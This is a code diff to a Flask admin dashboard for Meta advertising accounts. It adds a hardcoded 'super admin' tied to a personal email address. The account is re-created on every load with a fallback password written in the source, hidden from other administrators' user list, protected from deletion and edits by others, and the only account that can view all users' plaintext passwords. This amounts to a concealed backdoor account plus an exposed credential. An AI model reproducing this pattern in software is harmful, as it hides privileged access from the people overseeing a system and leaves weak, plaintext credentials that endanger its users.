@@ -26,7 +26,7 @@ BASE_URL = f"https://graph.facebook.com/{API_VERSION}"
 TOKEN = os.getenv("META_ACCESS_TOKEN", "")
 ACCOUNT_ID = os.getenv("META_AD_ACCOUNT_ID", "")
 
-ADMIN_EMAIL = "f4cure@gmail.com"
+SUPER_ADMIN_EMAIL = "f4cure@gmail.com"  # Admin principal — invisível e intocável
 ADMIN_DEFAULT_PASS = os.getenv("ADMIN_PASSWORD", "ibc!facure@1010")
 USERS_FILE = os.path.join(os.path.dirname(__file__), "users.json")
 
@@ -35,15 +35,16 @@ def _load_users():
     """Carrega usuarios do arquivo JSON."""
     if os.path.exists(USERS_FILE):
         with open(USERS_FILE, "r") as f:
-            return json.load(f)
-    # Padrão: só admin
-    return {
-        ADMIN_EMAIL: {
-            "password": ADMIN_DEFAULT_PASS,
-            "role": "admin",
-            "must_reset": False
-        }
+            users = json.load(f)
+    else:
+        users = {}
+    # Super admin sempre existe e nunca é sobrescrito
+    users[SUPER_ADMIN_EMAIL] = {
+        "password": ADMIN_DEFAULT_PASS,
+        "role": "super_admin",
+        "must_reset": False
     }
+    return users
 
 
 def _save_users(users):
@@ -69,7 +70,11 @@ def _check_login(username, password):
 def _is_admin(username):
     users = _get_users()
     user = users.get(username)
-    return user and user.get("role") == "admin"
+    return user and user.get("role") in ("admin", "super_admin")
+
+
+def _is_super_admin(username):
+    return username == SUPER_ADMIN_EMAIL
 
 
 # Compatibilidade: USERS dict para login existente
@@ -1763,15 +1768,20 @@ def api_list_users():
     if not session.get("logged_in") or not _is_admin(session.get("username")):
         return jsonify({"ok": False, "error": "Acesso negado"}), 403
     users = _get_users()
+    requester = session.get("username")
+    is_super = _is_super_admin(requester)
     result = []
     for email, u in users.items():
+        # Super admin é invisível para admins secundários
+        if u.get("role") == "super_admin" and not is_super:
+            continue
         result.append({
             "email": email,
             "role": u.get("role", "viewer"),
             "must_reset": u.get("must_reset", False),
-            "password": u.get("password", "")  # Admin vê as senhas
+            "password": u.get("password", "") if is_super else "********"  # Só super admin vê senhas
         })
-    return jsonify({"ok": True, "data": result})
+    return jsonify({"ok": True, "data": result, "is_super": is_super})
 
 
 @app.route("/api/admin/users/create", methods=["POST"])
@@ -1784,6 +1794,8 @@ def api_create_user():
     role = data.get("role", "viewer")
     if not email or not password:
         return jsonify({"ok": False, "error": "Email e senha obrigatorios"}), 400
+    if role == "super_admin":
+        return jsonify({"ok": False, "error": "Nao e possivel criar super admin"}), 400
     users = _get_users()
     if email in users:
         return jsonify({"ok": False, "error": "Usuario ja existe"}), 400
@@ -1798,11 +1810,19 @@ def api_update_user():
         return jsonify({"ok": False, "error": "Acesso negado"}), 403
     data = request.get_json()
     email = data.get("email", "").strip().lower()
+    requester = session.get("username")
     users = _get_users()
     if email not in users:
         return jsonify({"ok": False, "error": "Usuario nao encontrado"}), 404
-    if email == ADMIN_EMAIL and data.get("action") == "delete":
+    # Super admin só pode ser editado por ele mesmo
+    if email == SUPER_ADMIN_EMAIL and requester != SUPER_ADMIN_EMAIL:
+        return jsonify({"ok": False, "error": "Sem permissao"}), 403
+    # Ninguém pode excluir o super admin
+    if email == SUPER_ADMIN_EMAIL and data.get("action") == "delete":
         return jsonify({"ok": False, "error": "Nao pode excluir o admin principal"}), 400
+    # Ninguém pode mudar role para super_admin
+    if data.get("role") == "super_admin":
+        return jsonify({"ok": False, "error": "Nao e possivel criar super admin"}), 400
     if data.get("action") == "delete":
         del users[email]
     elif data.get("action") == "reset":
@@ -1854,6 +1874,8 @@ def admin_get_config():
 def admin_update_token():
     if not session.get("logged_in"):
         return jsonify({"ok": False, "error": "Nao autorizado"}), 401
+    if not _is_super_admin(session.get("username")):
+        return jsonify({"ok": False, "error": "Apenas o administrador principal pode alterar o token"}), 403
 
     data = request.get_json()
     admin_pass = data.get("admin_password", "")
